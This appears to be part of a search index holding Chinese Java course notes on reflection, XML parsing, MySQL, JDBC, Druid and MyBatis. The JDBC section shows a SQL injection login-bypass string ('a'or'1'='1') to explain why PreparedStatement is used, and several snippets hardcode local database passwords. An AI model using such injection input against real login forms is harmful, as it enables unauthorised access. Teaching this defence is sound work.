| 方法名 | 说明 | | ----------------------------------------------------------- | --------------------------- | | String readFileToString(Filefile, String encoding) | 读取文件中的数据,返回字符串 | | void copyFile(FilesrcFile, File destFile) | 复制文件 | | void copyDirectoryToDirectory(FilesrcDir, File destDir) | 复制文件夹 | NIO JDK1.4以前: InputStream/OutputStream称为BIO(Blocking IO) 阻塞式IO 阻塞：如果没有数据就一直等待 JDK1.4推出了一套新的IO体系称为NIO (New IO/ Not Blocking IO) 非阻塞式IO 非阻塞：如果没有数据，不会一直等待，可以做其他事 NIO的三个角色 Channel通道 可以双向传输数据 ByteBuffer 相当于BIO中的byte[]，效率更高，功能更强大，可以保存要发送和接收的数据 Selector选择器 使用了多路复用，可以管理多个连接 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-26 22:53 "},"Java笔记/Day13-反射+注解.html":{"url":"Java笔记/Day13-反射+注解.html","title":"Day13-反射+注解","keywords":"","body":"反射 Class类创建的对象我们称为Class对象/类对象/字节码对象，会保存类中的信息（构造方法、成员方法、成员变量等） 获取Class对象的三种方式（推荐使用第一种或第三种） // 类名.class;Class: Class cls1 = Employee.class; // 对象.getClass();Class:获取当前类或者其子类的类对象 Employee emp = new Employee(); Class cls2 = emp.getClass(); // Class.forName(\"类全名\");包名.类名 Class cls3 = Class.forName(\"com.itheima.bean.Employee\"); 获取对象信息的方法 String getSimpleName();//获取类名字符串：类名 String getName(); //获取类全名：包名.类名 反射获取构造器 | 方法 | 说明 | | ------------------------------------------------------------ | ------------------------------------------ | | Constructor[] getConstructors() | 返回所有构造器对象的数组（只能拿public的） | | Constructor getConstructor(Class... parameterTypes) | 返回单个构造器对象（只能拿public的） | | Constructor[] getDeclaredConstructors() | 返回所有构造器对象的数组，存在就能拿到 | | Constructor getDeclaredConstructor(Class... parameterTypes) | 返回单个构造器对象，存在就能拿到 | Constructor类中的方法 | 符号 | 说明 | | ------------------------------------------- | ------------------------------------------ | | T newInstance(Object... initargs) | 根据指定的构造器创建对象 | | public void setAccessible(boolean flag) | 设置为true，表示取消访问检查，进行暴力反射 | 反射获取成员方法 | 方法 | 说明 | | ------------------------------------------------------------ | -------------------------------------------- | | Method[] getMethods() | 返回所有成员方法对象的数组（只能拿public的） | | Method getMethod(String name, Class... parameterTypes) | 返回单个成员方法对象（只能拿public的） | | Method[] getDeclaredMethods() | 返回所有成员方法对象的数组，存在就能拿到 | | Method getDeclaredMethod(String name, Class... parameterTypes) | 返回单个成员方法对象，存在就能拿到 | Method类中的方法 | 方法 | 说明 | | --------------------------------------------- | ------------------------------------------------------------ | | Object invoke(Object obj, Object... args) | 调用方法，参数一：用obj对象调用该方法；参数二：调用方法的传递参数（没有就不写） | | public void setAccessible(boolean flag) | 设置为true，表示取消访问检查，进行暴力反射 | 反射获取成员变量 | 方法 | 说明 | | --------------------------------------- | -------------------------------------------- | | Field[] getFields() | 返回所有成员变量对象的数组（只能拿public的） | | Field getField(String name) | 返回单个成员变量对象（只能拿public的） | | Field[] getDeclaredFields() | 返回所有成员变量对象的数组，存在就能拿到 | | Field getDeclaredField(String name) | 返回单个成员变量对象，存在就能拿到 | Field类中的方法 | 符号 | 说明 | | ------------------------------------------- | ------------------------------------------ | | void set(Object obj, Object value) | 赋值 | | Object get(Object obj) | 获取值 | | public void setAccessible(boolean flag) | 设置为true，表示取消访问检查，进行暴力反射 | 反射应用案例 通过修改简单的变量，灵活的操作对象（修改、增加） // 1.通过Properties加载配置文件 Properties pp = new Properties(); pp.load(new FileReader(\"D:\\\\code\\\\javaUp182\\\\study_day13\\\\src\\\\config.properties\")); // 2.得到类名和方法名 通过键找值 String className = pp.getProperty(\"className\"); String methodName = pp.getProperty(\"methodName\"); // 3.通过类名反射得到Class对象 Class cls = Class.forName(className); // 4.通过Class对象创建一个对象 Object obj = cls.getConstructor().newInstance(); // 5.通过Class对象得到方法 Method method = cls.getMethod(methodName); // 6.调用方法 method.invoke(obj); 注解 自定义注解 属性类型只能是：基本数据类型、String、Class、注解、枚举、以及以上类型的一维数组 public @interface 注解名称 { public 属性类型 属性名(); } 元注解 @Target(ElemenType.METHOD) @Retention(RetentionPolicy.SOURCE) public @interface Override { } // @Target 指定注解能在哪里使用 TYPE 类，接口 FIELD 成员变量 METHOD 成员方法 PARAMETER 方法参数 CONSTRUCTOR 构造方法 LOCAL_VARIABLE 局部变量 // @Retention 保留时间（生命周期） SOURCE 只作用于：源码阶段 CLASS 只作用于：源码阶段、字节码阶段【默认值】 RUNTIME 只作用于：源码阶段、字节码阶段、运行阶段 注解解析 AnnotatedElement接口定义了与注解解析相关的方法 | 方法名 | 说明 | | ------------------------------------------------------------ | ------------------------------------------------------------ | | T getAnnotation(Class annotationClass) | 根据注解类型获得对应注解对象 | | Annotation[] getAnnotations() | 获得当前对象上使用的所有注解 | | boolean isAnnotationPresent(ClassannotationClass) | 判断当前对象是否使用了指定的注解，如果使用了则返回true，否则false | 注解在谁头上就用谁来解析 构造方法上使用Constructor来获取 成员方法上使用Method来获取 成员变量上使用Field来获取 注解解析案例 //注解解析案例 public static void main(String[] args) throws NoSuchMethodException { //1.获取类的Class对象 Class cls = Book.class; //2.获取类的方法 Method booking = cls.getMethod(\"booking\"); //3.找上面的注解 运行期间获取 ， boolean b = booking.isAnnotationPresent(BookAnno.class); if (b) { BookAnno anno = booking.getAnnotation(BookAnno.class); //4.打印注解上的内容 System.out.println(anno.name() + anno.price() + Arrays.toString(anno.authors())); } } //自定义类 public class Book { @MyAnno4 @BookAnno(name = \"脱口秀工作手册\", price = 18.8, authors = {\"李诞\", \"王建国\"}) public void booking() { System.out.println(\"年轻人就要好好读书\"); } } //自定义注解 @Retention(RetentionPolicy.RUNTIME) //源代码时期 字节码时期 运行时期存活 public @interface BookAnno { public String name(); public double price(); public String[] authors(); } Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-17 22:40 "},"Java笔记/Day14-XML+Dom4j+动态代理.html":{"url":"Java笔记/Day14-XML+Dom4j+动态代理.html","title":"Day14-XML+Dom4j+动态代理","keywords":"","body":"XML XML是一种可扩展的标记语言 可扩展：标签的名字是可以自定义的 作用：被设计用来存储和传输数据 语法： 文档声明格式： 注释（快捷键Ctrl+/）： 标签也称为元素 由一对尖括号和合法标识符组成 必须成对出现 没有内容的标签可以提前结束简写成 标签可以定义属性，属性和标签名空格隔开 属性值必须用引号 标签不能相互嵌套 根标签 没有被其他标签包裹的标签 一个XML文档中，只允许有一个跟标签 实体字符/转义字符 以&开头；结尾 &amp; 字符数据区（快捷键CD） 放在CDATA字符数据区中的数据作为纯文本解析，原样显示 ]]> 约束 DTD约束缺点： 不能验证数据类型 本身是一个文本文件，不能验证本身是否正确 格式： //本地约束： //网络约束： Schema约束 数据类型约束更完善 本身是XML文件，扩展名.xsd 一个XML中可以引用多个Schema文件 格式： dom4j DOM解析：一次读取XML中的所有数据，在内存中形成一颗DOM树 SAXReader对象 | 方法名 | 说明 | | -------------------------- | ----------- | | SAXReader() | 创建解析器 | | Document read(Fileurl) | 解析XML文档 | Document对象 | 方法名 | 说明 | | ---------------------------- | ---------- | | Element getRootElement() | 获得根元素 | Element对象 | 方法名 | 说明 | | -------------------------------------- | ------------------------------------------------------------ | | List elements() | 得到当前元素下所有子元素 | | List elements(Stringname) | 得到当前元素下指定名字的子元素返回集合 | | Element element(Stringname) | 得到当前元素下指定名字的子元素,如果有很多名字相同的返回第一个 | | String attributeValue(String name) | 通过属性名直接得到属性值 | | String elementText(子元素名) | 得到指定名称的子元素的文本 | | String getName() | 得到元素名字 | | String getText() | 得到文本 | 对于要经常得到的XML的数据，若每次解析则IO占用较高，可以把数据保存到对象中 //解析XML案例 public static void main(String[] args) throws DocumentException { //创建解析器 SAXReader sr = new SAXReader(); //解析XML形成DOM树 Document document = sr.read(new File(\"study_day14\\\\04_解析XML\\\\Contact.xml\")); //获取根元素 Element root = document.getRootElement(); //创建存储信息的对象 ArrayList list = new ArrayList<>(); //获取所有contact标签集合 List contactList = root.elements(\"contact\"); for (Element contact : contactList) { //获取属性值 String id = contact.attributeValue(\"id\"); String vip = contact.attributeValue(\"vip\"); //获取子标签内容 String name = contact.element(\"name\").getText(); String gender = contact.element(\"gender\").getText(); String email = contact.element(\"email\").getText(); //存储对象信息 Contact user = new Contact(Integer.parseInt(id),Boolean.parseBoolean(vip),name,gender,email); list.add(user); } list.forEach(System.out::println); } 潘金莲 女 panpan@itcast.cn 武松 男 wusong@itcast.cn 武大狼 男 wuda@itcast.cn 小王 老王 XPath 需要导入dom4j和jaxen-1.1.2.jar包 Document中的方法 | 方法名 | 说明 | | ------------------------------------ | ------------------------ | | Node selectSingleNode(\"表达式\") | 获取符合表达式的唯一元素 | | List selectNodes(\"表达式\") | 获取符合表达式的元素集合 | XPath的查找方法 | 查找方式 | 路径 | 说明 | | -------------- | --------------------- | ------------------------------------------------ | | 绝对路径 | /根元素/子元素/孙元素 | 从根元素开始，一级一级向下查找，不能跨级 | | 相对路径 | ./子元素/孙元素 | 从当前元素开始，一级一级向下查找，不能跨级 | | 全文搜索 | //元素 | 找元素，无论元素在哪里，可以跳级 | | 属性查询找属性 | //@属性名 | 查找属性对象，无论是哪个元素，只要有这个属性即可 | | 属性查找元素 | //元素[@属性名] | 查找元素对象，全文搜索指定元素名和属性名 | public class Demo02 { public static Document document = null; static { SAXReader sr = new SAXReader(); try { //【注意点】junit的相对路径不包括模块名 document = sr.read(new File(\"04_解析XML\\\\Contact.xml\")); } catch (DocumentException e) { e.printStackTrace(); } } // XPath：绝对路径 @Test public void test01() { // 定义 XPath 表达式：/contactList/contact/name // 调用Document对象的selectNodes()方法执行XPath获得节点 List nodes = document.selectNodes(\"/contactList/contact/name\"); for (Node node : nodes) { System.out.println(node.getName() + \":\" + node.getText()); } } // XPath：相对路径, 以调selectNodes方法用者作为参照往后找 @Test public void test02() { // 获得根节点对象 // 定义 XPath 表达式：./contact/name // 调用Document对象的selectNodes()方法执行XPath获得节点 Element root = document.getRootElement(); List nodes = root.selectNodes(\"./contact/name\"); for (Node node : nodes) { System.out.println(node.getName() + \":\" + node.getText()); } } // XPath：全文搜索 @Test public void test03() { // 创建XPath表达式: //name // 调用Document对象的selectNodes()方法执行XPath获得节点 // List nodes = document.selectNodes(\"//name\"); List nodes = document.selectNodes(\"//name\"); for (Node node : nodes) { System.out.println(node.getName() + \":\" + node.getText()); } } // XPath：属性查找 //@属性名 全文搜索属性,返回的是属性对象 @Test public void test04() { // 创建XPath表达式: //@id 获取所有的id属性 // 调用Document对象的selectNodes()方法执行XPath获得节点 List nodes = document.selectNodes(\"//@id\"); for (Node node : nodes) { System.out.println(node.getName() + \":\" + node.getText()); } } // XPath：属性查找 //元素[@属性名] 查找具有指定属性名的元素 @Test public void test05() { // 创建XPath表达式: //contact[@vip] 获取包含vip属性的contact元素 // 调用Document对象的selectNodes()方法执行XPath获得节点 List nodes = document.selectNodes(\"//contact[@vip='true']\"); for (Node node : nodes) { //System.out.println(node.getName() + \":\" + node.getText()); Element element = (Element) node; String str = element.elementText(\"name\"); System.out.println(\"str = \" + str); } } } 工厂模式 作用：解决类与类之间的耦合问题，屏蔽了外界对具体类的依赖，让类的创建更加简单 实现步骤： 编写一个Car接口, 提供run方法 编写一个Benz类实现Car接口,重写run方法 编写一个Bmw类实现Car接口,重写run方法 提供一个CarFactory(汽车工厂),用于生产汽车对象 在CarFactoryTes测试类使用汽车工厂创建对象 动态代理 代理模式三要素 真实对象 代理对象 接口：代理对象和真实对象都要实现的接口 优点 可以在不改变方法源码的情况下，实现对方法功能的增强 简化了代码 提高了软件系统的可扩展性 public static void main(String[] args) { //创建真实对象 QQlogin qq = new QQlogin(); //创建代理对象（记得强转为需要代理实现的接口） Login proxyLogin = (Login)Proxy.newProxyInstance( //参数1：类加载器 QQlogin.class.getClassLoader(), //参数2：需要代理实现的接口 new Class[]{Login.class}, //参数3：执行处理器，把要增强的功能写里面 new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { //Object proxy 生成的代理类的对象，不要使用 //Method method 原目标要执行的方法 //Object[] args 原目标要执行的方法的实参 System.out.println(new Date());//增强功能 Object result = method.invoke(qq, args);//反射调用真实对象的方法 System.out.println(\"其他操作\");//增强功能 return result; } } ); //代理对象调用方法 proxyLogin.login(); proxyLogin.logout(); } //真实类 public class QQlogin implements Login{ @Override public void login() { System.out.println(\"QQ上线了\"); } @Override public void logout() { System.out.println(\"QQ下线了\"); } } //接口 public interface Login { public abstract void login(); public abstract void logout(); } Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-20 10:36 "},"Java笔记/Day15-MySQL基础.html":{"url":"Java笔记/Day15-MySQL基础.html","title":"Day15-MySQL基础","keywords":"","body":"数据库 数据库：存储和管理数据的仓库，Database，简称DB MySql服务器中可以创建多个数据库，每个数据库可以包含多张表，每个表可以存储多条数据记录 MySql是关系型数据库，是由多张相互连接的二维表组成的数据库 mysql登录： 本机登录mysql -u用户名 -p 远程登录mysql -h远程主机IP -u用户名 -p SQL DDL数据定义语言：用来定义数据库对象：数据库、表、列表 DML数据操作语言：用来对数据库中表的数据进行增删改 DQL数据查询语言：用来查询数据库中表的数据 DCL数据控制语言：用来定义数据库的访问权限和安全级别、及创建用户 对比记忆版 增 创建数据库：create database if not exists 数据库名称; 创建表：create table 表名 (字段名 数据类型, 字段名 数据类型); 添加一个字段：alter table 表名 add 字段名 数据类型; 给指定列添加数据：insert into 表名 (字段名1, 字段名2) values (值1, 值2); 删 删除数据库：drop database if exists 数据库名称; 删除表：drop table 表名; 删除某一字段：alter table 表名 drop 字段名; 删除数据：delete from 表名 [where 条件]; 改 修改表/字段：alter table 表名 ....（rename to、add、modify、change） 修改数据：update 表名 set 字段名 = 新的值 [where 条件]; 查 查询所有数据库：show databases; 查看所有表：show tables; 查看表结构：desc 表名; DDL 操作数据库 查询所有数据库：show databases; 创建数据库 普通创建：create database 数据库名称; 判断创建：create database if not exists 数据库名称; 删除数据库 普通删除：drop database 数据库名称; 判断删除：drop database if exists 数据库名称; 使用数据库：use 数据库名称; 操作表 创建表：create table 表名 (字段名 数据类型, 字段名 数据类型); 查看所有表：show tables; 查看表结构：desc 表名; 删除表：drop table 表名; 修改表 基础语法：alter table 表名 .... 修改表名：alter table 表名 rename to 新表名; 单独添加一个字段：alter table 表名 add 字段名 数据类型; 修改某字段的数据类型：alter table 表名 modify 字段名 新数据类型; 修改字段名和数据类型：alter table 表名 change 字段名 新字段名 新数据类型; 删除某一字段：alter table 表名 drop 字段名; DML 增加 给指定列添加数据：insert into 表名 (字段名1, 字段名2) values (值1, 值2); 给全部列添加数据：insert into 表名 values (值1, 值2); 批量添加数据：insert into 表名 values (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...); 【修改】：update 表名 set 字段名 = 新的值 [where 条件]; 【删除】：delete from 表名 [where 条件]; DQL 简单查询 普通查询：select 字段名1, 字段名2 from 表名; 查询所有字段的简写方法（测试可用，开发效率低不推荐）：select * from 表名; 【去重查询】：select distinct 字段名1 from 表名; 计算列的值：select 字段名1(+-*/)字段名2 from 表名; 起别名：select 字段名1 as 别名1, 字段名2 as 别名2 from 表名; 条件查询 基础语法：select * from 表名 where 条件; 比较运算：>、=、或!=不等于 select * from 表名 where 字段名1 > 值1; 逻辑运算：AND或&&、OR或||、NOT或！ select * from 表名 where 字段名1 > 值1 and 字段名2 范围查询： 在某个范围内（值1select * from 表名 where 字段名1 between 值1 and 值2; 多选：select * from 表名 where 字段名1 in (值1, 值2); null的处理（is null或is not null）： select * from 表名 where 字段名1 is null; 模糊查询：select * from 表名 where 字段名1 like '通配字符串'; %：表示任意多个字符 _：表示一个任意字符 【排序查询】：select 字段名 from 表名 order by 列名1 排序方式1, 列名2 排序方式2; ASC：升序 DESC：降序 【聚合排序】：select 聚合函数(字段名) from 表名; 聚合函数：count、sum、max、min、avg 【分组查询】： 分组：select * from 表名 group by 字段名; 分组通常和聚合函数一起使用：select 字段名, 聚合函数(*) from 表名 group by 字段名; 分页查询：select * from 表名 limit 跳过条数, 显示条数; 注意点 常用数据类型 int：整数类型 double：小数类型 varchar(长度)：可变长度的字符串 date：日期类型yyyy-MM-dd 添加数据时 字段名和值的数量要对应 值的类型和字段的类型要对应 除了数值类型，其他数据类型的数据都需要加引号 聚合函数 select 聚合函数(字段名) from 表名;记录为null的默认不统计 select 聚合函数(*) from 表名;可以把所有行数统计进去（包括null） 如果不是数值类型的字段，计算结果为0 分组查询固定写法 where条件要放在group by的前面 where条件不能是聚合函数 having条件判断，可以和聚合函数使用，放在group by的后面 having和where的区别 where是在分组前对数据进行过滤，having是在分组后对数据进行过滤 where后面不可以使用聚合函数，having后面可以使用聚合函数 分页查询limit limit是MySQL的方言 Oracle分页查询使用rownumber SQL Server使用top Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-25 20:15 "},"Java笔记/Day16-MySQL高级.html":{"url":"Java笔记/Day16-MySQL高级.html","title":"Day16-MySQL高级","keywords":"","body":"约束 主键约束 建表时添加主键约束 //没有约束名称 create table 表名 ( 字段名1 字段类型 primary key, 字段名2 字段类型 ); //有约束名称 create table 表名 ( 字段名1 数据类型, [constraint 自定义约束名称] primary key(字段名1), 字段名2 字段类型 ); 建表后单独添加主键约束 alter table 表名 add primary key(字段名); 删除主键约束 alter table 表名 drop primary key; 主键自增（字段类型必须为数值） 字段名 字段类型 primary key atuo_incerment -- 已有主键的字段添加自增 alter table 表名 change 字段名 字段名 字段类型 auto_incrment; 唯一约束：字段名 字段类型 unique 非空约束：字段名 字段类型 not null 默认约束：字段名 字段类型 default 值 外键约束 外键：一张表中的某个字段引用其他表的主键，这个字段称为外键 主表：将数据给别人用的表 副表/从表：使用别人数据的表 新建表时增加外键约束 create table 表名 ( 字段名 字段类型, 字段名 字段类型, [constraint 外键约束名] froeign key(外键字段名) references 主表(主键字段名) ); 已有表增加外键约束 alter table 从表 ADD [constraint 外键约束名称] foreign key(外键字段名) references 主表(主键字段名); 删除外键约束 alter table 表名 drop foreign key 外键约束名; 数据库设计 有哪些表？表里有哪些字段？表和表之间有什么关系？ 表关系 一对一：多用于表拆分，将一个实体中经常使用的字段放一张表，不经常使用的字段放另一张表，提升查询性能 实现方式：在任意一方加入外键，关联另一方主键，并且设置外键为唯一unique 一对多：一个部门对应多个员工 实现方式：在多的一方建立外键 多对多：一个商品对应多个订单，一个订单包含多个商品 实现方式：建立第三张中间表，中间表至少包含两个外键，分别关联两方主键 事务 事务把所有的命令作为一个整体一起向系统提交或撤销操作请求，即这一组命令要么同时成功，要么同时失败 -- 开启事务 start transaction; -- 提交事务 commit; -- 回滚事务 rollback; 事务的四大特性ACID 原子性Atomicity：事务是不可分割的最小操作单位，要么同时成功，要么同时失败 一致性Consistency：使得数据库从一种正确状态转换成另一种正确状态 隔离性Isolation：在事务正确提交之前，不允许把该事务对数据的任何改变提供给任何其他事务 持久性Durability：事务正确提交后，其结果将永久保存在数据库中，即使在事务提交后有了其他故障，事务的处理结果也会得到保存 多表查询 表连接查询 内连接 隐式内连接：select 字段列表 from 表1，表2 where 条件; 显式内连接：select 字段列表 from 表1 [inner] join 表2 on 表连接条件; 外连接 左外连接：select 字段列表 from 表1 left [outer] join 表2 on 表连接条件; 右外连接：select 字段列表 from 表1 right [outer] join 表2 on 表连接条件; 子查询 一个查询语句的结果作为另一个查询语句的一部分 查询结果单行单列，在where后面作为条件 select 查询字段 from 表 where 字段=(子查询); 查询结果是多行单列，结果类似一个数组，在where后面作为条件 select 查询字段 from 表 where 字段 in (子查询); 查询结果是多行多列，在from后面作为虚拟表 select 查询字段 from (子查询) 表别名 where 查询条件; 多表查询 根据需求明确查询哪些表 明确表连接条件去掉笛卡尔积 后续的查询 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-29 10:42 "},"Java笔记/Day17-JDBC.html":{"url":"Java笔记/Day17-JDBC.html","title":"Day17-JDBC","keywords":"","body":"JDBC Java Data Base Connectivity：Java数据库连接 JDBC API public static void main(String[] args) throws SQLException { //1、注册驱动 DriverManager：用于注册驱动 //MySQL 5之后的驱动包，可以省略注册驱动的步骤 DriverManager.registerDriver(new com.mysql.jdbc.Driver()); //2、获取数据库连接 Connection：表示数据库的连接 Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/db1?useSSL=false\", \"root\", \"S9tly\"); //3、获取执行SQL语句的对对象 Statement：执行SQL语句的对象 Statement state = conn.createStatement(); //4、执行SQL语句并返回结果 ResultSet：结果集 String sql1 = \"insert into st1(id,name,age) values(3,'张三',23)\"; String sql2 = \"delete from st1 where id = 3\"; String sql3 = \"select * from st1\"; //int row = state.executeUpdate(sql1); //System.out.println(\"成功修改\" + row + \"行\"); //int row = state.executeUpdate(sql2); //System.out.println(\"成功删除\" + row + \"行\"); //5、处理结果 ArrayList list = new ArrayList<>(); ResultSet rs = state.executeQuery(sql3); //rs.next()是否有下一行 while (rs.next()) { int id = rs.getInt(\"id\"); String name = rs.getString(\"name\"); int age = rs.getInt(\"age\"); //System.out.println(\"id：\" + id + \",name：\" + name + \",age：\" + age); list.add(new student(id, name, age)); } //6、关闭资源 rs.close(); state.close(); conn.close(); list.forEach(System.out::println); } JDBC 事务 public static void main (String[]args){ // 1.注册驱动(自动注册) Connection con = null; Statement state = null; try { // 2.获取连接 con = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/day17?useSSL=false\", \"root\", \"root\"); // 3.开启事务 setAutoCommit false 表示开启手动提交事务， 如果设置为true表示自动提交事务，默认是true con.setAutoCommit(false); // 4.获取到Statement state = con.createStatement(); // 5.Statement执行SQL // 张三-500 state.executeUpdate(\"update account set balance = balance - 500 where id = 1\"); //模拟一个异常 //int a = 10/0; //计算异常 // 李四+500 state.executeUpdate(\"update account set balance = balance + 500 where id = 2\"); // 6.成功提交事务 con.commit(); System.out.println(\"成功提交事务！\"); } catch (Exception throwables) { // 6.失败回滚事务 try { if (con != null) { con.rollback(); } System.out.println(\"失败回滚事务~\"); } catch (SQLException e) { e.printStackTrace(); } throwables.printStackTrace(); } finally { try { if (state != null) { state.close(); } } catch (SQLException throwables) { throwables.printStackTrace(); } try { if (con != null) { con.close(); } } catch (SQLException throwables) { throwables.printStackTrace(); } } } SQL注入攻击 \"SELECT * FROM user WHERE name='hehe' AND password='a'or'1'='1'\" Statement对象在执行sql语句时，将密码的一部分内容当做查询条件来执行了 解决方法：PreparedStatement预编译执行者对象 public static void main(String[] args) throws SQLException { // 1.使用数据库保存用户的账号和密码 // 2.让用户输入账号和密码 Scanner sc = new Scanner(System.in); System.out.println(\"请输入账号：\"); String user = sc.next(); System.out.println(\"请输入密码\"); String password = sc.next(); // 3.使用SQL根据用户的账号和密码去数据库查询数据 Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/day17?useSSL=false\", \"root\", \"S9tly\"); String sql = \"select * from login where user=? and password=?\"; PreparedStatement state = conn.prepareStatement(sql); state.setString(1, user); state.setString(2, password); ResultSet rs = state.executeQuery(); // 4.如果查询到数据，说明登录成功 if (rs.next()) { System.out.println(user + \"用户你好！\"); } else { // 5.如果查询不到数据，说明登录失败 System.out.println(\"账号或密码错误！\"); } // 6.关闭资源 rs.close(); rs.close(); conn.close(); } 数据库连接池 Druid是阿里巴巴开发的号称为监控而生的数据库连接池 //druid.properties配置文件 url=jdbc:mysql://localhost:3306/day17?useSSL=false username=root password=S9tly driverClassName=com.mysql.jdbc.Driver initialSize=5 maxActive=10 maxWait=2000 //获取连接的工具类 // 1.导入druid-1.0.0.jar的jar包 // 2.复制druid.properties文件到src下，并设置对应参数 public class DruidDataSourceUtils { //希望连接池在被使用的时候只加载一次 private static DataSource ds = null; static{ try (FileReader fir = new FileReader(\"study_day17\\\\src\\\\druid.properties\")){ // 3.加载properties文件的内容到Properties对象中 Properties pp = new Properties(); pp.load(fir); // 4.创建Druid连接池，使用配置文件中的参数 ds = DruidDataSourceFactory.createDataSource(pp); } catch (Exception e) { e.printStackTrace(); } } //对外暴露一个获取连接的方法 //返回的结果可以尽量选择范围更大的 //提供公共方法的时候，谁调用谁负责 public static Connection getConection() throws SQLException { return ds.getConnection(); } } public static void main(String[] args) throws Exception { // 5.从Druid连接池中取出连接 Connection conn = DruidDataSourceUtils.getConnection(); // 6.执行SQL语句 String sql = \"select * from login where user=?\"; PreparedStatement pstate = conn.prepareStatement(sql); pstate.setString(1, \"root\"); ResultSet rs = pstate.executeQuery(); while (rs.next()) { int id = rs.getInt(\"id\"); String user = rs.getString(\"user\"); String password = rs.getString(\"password\"); System.out.println(\"id:\" + id + \",uesr:\" + user + \",password:\" + password); } // 7.关闭资源 rs.close(); pstate.close(); conn.close();//【注意：只是将线程还回连接池，并不是关闭】 } Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-29 20:02 "},"Java笔记/Day18-Maven+MyBatis入门.html":{"url":"Java笔记/Day18-Maven+MyBatis入门.html","title":"Day18-Maven+MyBatis入门","keywords":"","body":"Maven 是专门用于管理和构建Java项目的工具 提供了一套标准化的项目结构 提供了一套依赖管理机制 提供了一套项目构建的标准化流程（编译、测试、打包、发布） Maven坐标 groupID：当前Mavent项目隶属的组织名称 artifactld：当前Mavent项目名称 version：当前项目版本号 IDEA常用Mavent命令 Mavent对项目构建的生命周期划分为3套 clean：清理项目，就是删除项目下的target目录 default：核心工作，例如编译、测试、打包、安装等 同一生命周期内，执行后面的命令时前面所有的命令会自动执行 compile：编译代码 test：执行测试代码 package：将项目打包 install：将项目打包并安装到本地仓库中 site：产生报告、发布站点等 可以通过设置坐标的依赖范围（标签无内容，默认值compile），设置jar包的作用范围 | 依赖范围 | 编译类路径 | 测试类路径 | 运行类路径 | 例子 | | ------------ | -------------- | -------------- | -------------- | ----------------- | | compile | Y | Y | Y | logback | | test | - | Y | - | Junit | | provided | Y | Y | - | servlet-api | | runtime | - | Y | Y | jdbc驱动 | | system | Y | Y | - | 存储在本地的jar包 | MyBatis MyBatis是一个优秀的持久层框架，用于简化JDBC开发 配置Mybatis框架 创建新模块（选用Mavent工具） 在pom.xml文件的标签内导入坐标，然后刷新 junit junit 4.12 test mysql mysql-connector-java 5.1.46 org.mybatis mybatis 3.5.5 在main/java下面创建cn.org.none.pojo包路径，然后创建对象类，并生成javabean public class User { private int id; private String username; private Date birthday; private String sex; private String address; 在main/java下面创建cn.org.none.mapper包路径，然后创建接口类，并编写方法 public interface UserMapper { //查询所有的用户 List findAllUsers(); } 在resources资源文件夹下创建cn.org.none.mapper文件夹，配置对应接口的映射文件 select * from user; 复制mybatis-config.xml到resources资源文件夹下，并配置对象类路径、数据库连接池配置以及接口类路径 --> 在test.java.cn.org.none路径下编写测试类 public class TestMybatis { @Test public void Test01() throws IOException { //1.在测试案例里面访问resoureces的资源，可以直接访问文件 String resource = \"mybatis-config.xml\"; //2.读取核心配置文件信息，生成一个输入流 InputStream inputStream = Resources.getResourceAsStream(resource); //3.创建一个生成SqlSession的工厂类 类似于连接池 SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); //4.获取sqlsession 建立连接 SqlSession sqlSession = sqlSessionFactory.openSession(); //5.获取执行方法的对象 使用动态代理生成执行方法的对象 UserMapper userMapper = sqlSession.getMapper(UserMapper.class); //6.调用方法 List allUsers = userMapper.findAllUsers(); //7.关闭资源 sqlSession.close(); } 包扫描 对于java和resources文件编译后都在classes类路径下，如果Mapper接口名称和SQL映射文件名称相同，并在同一目录下，则可以使用包扫描的方式简化SQL映射文件的加载 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-12-13 15:58 "},"Java笔记/Day19-MyBatis进阶.html":{"url":"Java笔记/Day19-MyBatis进阶.html","title":"Day19-MyBatis进阶","keywords":"","body":"Mybatis 复制模块需要更改的三个地方 增删查改 参数占位符 #{}先使用?占位，执行sql时将具体值赋值给? 底层使用的是PreparedStatement，不会出现sql注入问题；并且可以设置预编译，提高sql执行效率 ${}拼接sql，会存在sql注入的问题 底层使用的是Statement，可能出现sql注入问题 SQL语句中特殊字符处理 转义字符 对数据库进行增删改操作时需提交事务 手动提交事务sqlSession.commit(); 自动提交事务sqlSession=factory.openSession(true); 添加数据时获取新增的主键值 useGeneratedKeys=\"true\"使用MySQL生成的主键 keyProperty=\"属性\"实体类中对应的属性 增删查改对应的标签 | 标签 | 说明 | | -------- | ----------------- | | | 编写查询的SQL语句 | | | 编写添加的SQL语句 | | | 编写修改的SQL语句 | | | 编写删除的SQL语句 | //UserMapper.java文件 //查询所有的用户 List findAllUsers(); //查询单个用户 User selectUser(int id); //删除单个用户 void deleteUser(int id); //修改用户信息 int updateUser(User user); //添加用户 int addUser(User user); select * from user; select from user where id = #{id}; id,username,birthday,sex,address //测试文件 public class TestMybatis { @Test public void Test01() throws IOException { //1.在测试案例里面访问resoureces的资源，可以直接访问文件 String resource = \"mybatis-config.xml\"; //2.读取核心配置文件信息，生成一个输入流 InputStream inputStream = Resources.getResourceAsStream(resource); //3.创建一个生成SqlSession的工厂类 类似于连接池 SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); //4.获取sqlsession 建立连接 SqlSession sqlSession = sqlSessionFactory.openSession(); //5.获取执行对象 UserMapper userMapper = sqlSession.getMapper(UserMapper.class); //6.调用方法 List allUsers = userMapper.findAllUsers(); //7.关闭资源 sqlSession.close(); } @Test public void Test02() throws IOException { //6.调用方法 